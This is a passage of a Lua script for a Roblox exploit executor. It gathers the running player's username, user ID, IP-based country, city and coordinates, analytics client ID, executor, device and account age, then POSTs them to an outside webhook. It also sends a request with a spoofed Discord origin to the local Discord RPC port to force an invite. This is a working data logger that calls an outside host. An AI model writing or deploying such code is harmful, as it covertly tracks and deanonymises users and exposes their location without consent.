					.. "**[Player Username (D/U):](https://www.roblox.com/users/" .. game:GetService("Players").LocalPlayer.UserId .. "/profile)**  ```" .. game:GetService("Players").LocalPlayer.DisplayName .." (@".. game:GetService("Players").LocalPlayer.Name ..")" .. " ".. loadstring("return game:GetService('VoiceChatService'):IsVoiceEnabledForUserIdAsync(game:GetService('Players').LocalPlayer.UserId) and '✔️' or '❌'")() .. "```\n"
					.. "**[Player Location:](https://ip-api.com/#" .. tostring(api.ip)..")**  ```" .. tostring(api.country).." "..tostring("("..api.city..")") .." [".. tostring(api.latitude)..","..tostring(api.longitude) .. ']' .. " ```\n"
					.. "**[Game Name ("..tostring(#game:GetService("Players"):GetPlayers()).." Player".."):](https://www.roblox.com/games/"..tostring(PlaceId)..")**\n```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```\n"
                    .. "**Join Game Link (Executor):** ```" .. tostring("game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "', game.Players.LocalPlayer)") .. "```\n"
                    .. "**Join Game Link (Website):** ```" .. tostring("Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ', "' .. game.JobId .. '")') .. "```\n"
					.. "**ClientID:** ```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "``` \n"
                    .. "**Executor:** ```" .. tostring(identifyexecutor()).." ".. GetDevice() .. "``` \n"
                    .. "**Account Age:** ```" .. game:GetService("Players").LocalPlayer.AccountAge.."Day" .. tostring(" ("..os.date("%Y/%m/%d", os.time() - (game:GetService("Players").LocalPlayer.AccountAge * 86400))..")".."[Y/M/D]") .. "``` \n"
					.. "<t:" .. os.time() .. ":f>",
					["color"] = ColorPicker.Color
				}
			}
		}
		local data2 = {
			Url = webhook,
			Body = game:GetService("HttpService"):JSONEncode(data),
			Method = "POST",
			Headers = {["content-type"] = "application/json"}
		}
		request(data2)
        if not CheckHWID().Value then 
            request({
                Url = "http://127.0.0.1:6463/rpc?v=1",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["Origin"] = "https://discord.com"
                },
                Body = game:GetService("HttpService"):JSONEncode({
                    cmd = "INVITE_BROWSER",
                    args = {code = "4YtCepCRkN"},
                    nonce = game:GetService("HttpService"):GenerateGUID(false)
                })
            })
        end
	end
end)
